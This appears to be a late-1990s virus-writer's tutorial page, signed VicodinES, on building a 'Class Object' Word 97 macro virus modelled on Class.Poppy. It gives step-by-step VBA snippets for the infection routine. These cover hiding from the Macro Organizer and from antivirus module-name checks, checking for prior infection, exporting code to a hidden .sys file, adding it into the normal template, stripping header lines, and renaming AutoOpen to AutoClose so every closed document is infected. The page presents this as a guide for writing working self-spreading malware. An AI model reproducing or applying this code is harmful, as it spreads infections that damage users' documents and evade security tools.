<html>

<head>

<title>Tutorials - What is "Class Object Infection"?</title>
</head>

<body background="tuback01.gif" bgcolor="#C0C0C0" text="#000000"
link="#800000" vlink="#800000" alink="#800000">

<p align="center"><font color="#004080" size="6"><strong>What is
&quot;Class Object Infection&quot; ?<br>
</strong></font><font color="#004080" size="4"><strong>by
VicodinES /CB /TNN </strong></font></p>

<hr>

<p><strong>*What is it? Is it any better than a regular macro
virus? </strong></p>

<p>Currently all Word 97 macro viruses contain Modules and these
Modules then contain the macro subroutines and functions. A
&quot;Class Object&quot; macro virus does not have a Module and
therefore can not be seen in the Word 97 Macro Organizer. This
gives us our first advantage - you no longer have to bother
hooking File|Templates because even if the user pulls up the
File|Templates menu they will not see any macros!
&quot;Class&quot; macros can not be seen in the &quot;Macro
Organizer&quot; </p>

<p>Now you see one advantage, well there are others. A
&quot;Class Macro&quot; can not just be deleted from the Visual
Basic Editor. So even if the user discovers your &quot;Class
Virus&quot; he/she must actually highlight the code, select it
and then delete it. It's not as easy as just deleting a module.
Plus if they do not look close enough they may just think Word is
mistaken and that they do not have a virus since there are no
Modules in the document. Also many AV's use the Module name to
help them find and identify a macro virus but a &quot;Class
Virus&quot; does not have a Module name and they must rely on a
scan string. </p>

<p><strong>*What are the rules of a &quot;Class Virus&quot; ? </strong></p>

<p>A &quot;Class Virus&quot; has a few different constraints than
a regular Word 97 macro virus. First you can not have the same
subroutine or function in both an infected document and infected
normal template. For example this is a list of the subroutines in
Class.Poppy : </p>

<pre>
     &gt;Infected Document&lt;            &gt;Infected Normal Template&lt;
	AutoOpen	       -	AutoClose
	ViewVBCode	       -	ToolsMacro</pre>

<p>The code is essentially the same (except for a few minor
changes) in both the infected document and the infected normal
template but the subroutine names have to be different. Also you
can not have public variables they all must be private. I decided
to just stay away from private declarations just to make it
easier for my first &quot;Class Virus&quot; </p>

<p><strong>*How does it work? How can I write one? </strong></p>

<p>The first thing to figure out is where do you write your code.
The virus code is written in the &quot;Microsoft Word
Objects&quot; section in the Visual Basic Editor. This is where
you write your subroutines. </p>

<p>To reference your code you must always point to item(1) in the
visual basic components. Just like this example of Item(1) for
the active document: </p>

<blockquote>
    <pre>
ActiveDocument.VBProject.VBComponents.Item(1)</pre>
</blockquote>

<p>Item(1) is always the &quot;ThisDocument&quot; part of your
Word document(^1). This is the section you want to infect. </p>

<p>You will also need to figure out if you are already installed.
You can not use the old method of checking for your module name
in all the visual basic components because there is no module or
module name. The way to check it is to see if any code exists in
Item(1). 99.9% of the time this section of documents and
templates will be empty so all you have to do is check for any
code. Just count the number of lines and if there are zero lines
of code then it's safe to infect. For example this check of a
normal template: </p>

<blockquote>
    <pre>
NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines</pre>
</blockquote>

<p>So if the value returned is not zero then your already
installed but if the value is zero then you need to infect the
normal template. </p>

<p>To get your code out of the active document and into the
normal template (to infect the normal template) is a bit tricky.
You can not simply copy the code there. OrganizerCopy and
WordBasic.MacroCopy do not work and you can't just Export and
then Import code into Item(1). First thing to do is get your code
out of the active document. You can do this with the basic export
function. Such as this example from Class.Poppy: </p>

<blockquote>
    <pre>
ActiveDocument.VBProject.VBComponents.Item(1).Export &quot;c:\class.sys&quot;</pre>
</blockquote>

<p>I exported it to class.sys just because sys files are hidden
files by default. You could use any name you want to but I
decided to uses sys because it looks like it should be there if
the user stumbles on to it. </p>

<p>Now that we have exported our code we need to bring it into
the normal template to complete the infection. The way to do this
is to add it from the file class.sys (the import command will not
work). This exmaple from Class.Poppy shows how it's done: </p>

<blockquote>
    <pre>
Set host = NormalTemplate.VBProject.VBComponents.Item(1)
host.codemodule.AddFromFile (&quot;c:\class.sys&quot;)</pre>
</blockquote>

<p>I set &quot;host&quot; as the object to import into since it's
easier to continue to reference &quot;host&quot;. </p>

<p>Ok so we imported our code (class.sys) into the normal
template but there is a big BIG problem. The first four lines are
invalid. We imported these lines of code also (they are
automatically generated during the export): </p>

<blockquote>
    <pre>
VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
End</pre>
</blockquote>

<p>That is going to cause an error in our code and we need to
remove it! That can easily be done with the deletelines command.
For example (notice I still reference &quot;host&quot; from
above): </p>

<blockquote>
    <pre>
With host.codemodule
  For x = 1 To 4
   .deletelines 1
  Next x
End With</pre>
</blockquote>

<p>I delete line 1 four times. This way I remove all the extra
code that I don't need and don't want. </p>

<p>So are we done? Nope! We now have two identical codemodules in
Item(1). Both have the subroutine AutoOpen and as I stated before
that will not work - Word will give us an error and we will fail
to spread. So what we need to do is replace &quot;Sub
AutoOpen()&quot; with something else. What we can do is replace
it (in the normal template only) with a new subroutine name. One
that will work good with infection. I decided to go with
AutoClose so all documents that are closed will become infected.
Here is the example: </p>

<blockquote>
    <pre>
host.codemodule.replaceline 1, &quot;Sub AutoClose()&quot;</pre>
</blockquote>

<p>I knew &quot;Sub AutoOpen()&quot; would be line 1 since I
previously just removed the first four lines. </p>

<p><strong>*We done? </strong></p>

<p>And that should do it. We managed to check to see if we were
installed. Then since we weren't we exported our code and added
it in for the infection. We cleaned up our extra lines and did
the subroutines name change. That's all it takes :-) ... well a
few other things can be done, such as polymorphism, a payload and
some stealth. Check out the code for Class.Poppy if you want to
see how that is done. </p>

<p><strong>*Any extra suggestions? </strong></p>

<p>Oh ok - the most fun thing you can do is swamp your Item(1)
name just before you export your code. This way the virus will
adapt its Item(1) name to any Non-English version of Word. It can
be done like this: </p>

<blockquote>
    <pre>
ActiveDocument.VBProject.VBComponents.Item(1).Name = _
NormalTemplate.VBProject.VBComponents.Item(1).Name</pre>
</blockquote>

<p>Do This right before your export and if the normal template
Item(1) has a different name then the document Item(1) then it
will adopt this new name and if the names are the same then
nothing will change! </p>

<p>Peace, VicodinES </p>

<hr>

<p><strong>Facts: </strong></p>

<ol>
    <li>Class.Poppy was the first virus to do any of this. </li>
    <li>Slage Hammer helped me test on Non-English versions. </li>
    <li>The export to sys file was first done by Reptile/29A. </li>
</ol>

<p>Footnote: </p>

<p>^1 - it may be called other things in Non-English versions of
Word </p>

<hr>
</body>
</html>
